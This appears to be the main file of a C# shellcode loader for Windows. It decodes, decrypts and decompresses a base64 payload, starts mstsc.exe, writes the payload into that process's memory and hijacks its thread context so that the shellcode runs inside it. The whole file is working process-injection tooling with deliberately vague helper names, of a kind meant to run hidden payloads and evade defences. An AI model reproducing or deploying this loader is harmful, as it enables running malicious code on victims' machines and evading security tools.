using System;
using MakeProc;

namespace BlockMe
{
    public class Program
    {        
        public static void Main(string[] args)
        {
            byte[] compressedShellcode;

            //parse args
            if (args[1] == "1")
            {
                // Load payload from file.
                string fileContents = System.IO.File.ReadAllText(args[0]);

                // Decode base64
                compressedShellcode = Convert.FromBase64String(fileContents);
            }
            else
            {
                // Load payload from environmental variable.
                compressedShellcode = Convert.FromBase64String(args[0]);
            }

            // Decrypt gzip data.
            byte[] dGzip = DecripAndDepress.DecripAndDepress.Decrip(compressedShellcode);

            // GZip Decompress
            byte[] buf = DecripAndDepress.DecripAndDepress.DecompressGzip(dGzip);

            // Create the target process mstsc.exe and populate struct with process information:
            PROCESS_INFORMATION procInfo = GetProc.ReturnProcInfo();

            // Open thread and change context for better access
            IntPtr hThread = ThreadWork.ChThread.ReturnThread(procInfo);

            // Allocate memory in the target process; size of payload:
            IntPtr nemM = GetMem.GetMem.ReturnMem(procInfo, buf.Length);

            // Move payload into allocated memory in target process:
            MoveCode.MoveInto.CngEntry(procInfo, nemM, buf);

            // Get Context data from process:
            GetContext.GetContext.CONTEXT ctx = GetContext.GetContext.ReturnNewContext(procInfo, hThread, nemM);

            // Set RCX to shellcode pointer:
            ctx.Rcx = (ulong)nemM;
            SetNewContext.SetNewContext.ReturnNothing(procInfo, hThread, ctx, nemM);

            // Resume thread; should start executing at allocated pointer:
            ResumeIt.ResumeIt.ReturnNothing(procInfo, hThread, nemM);
        }
    }
}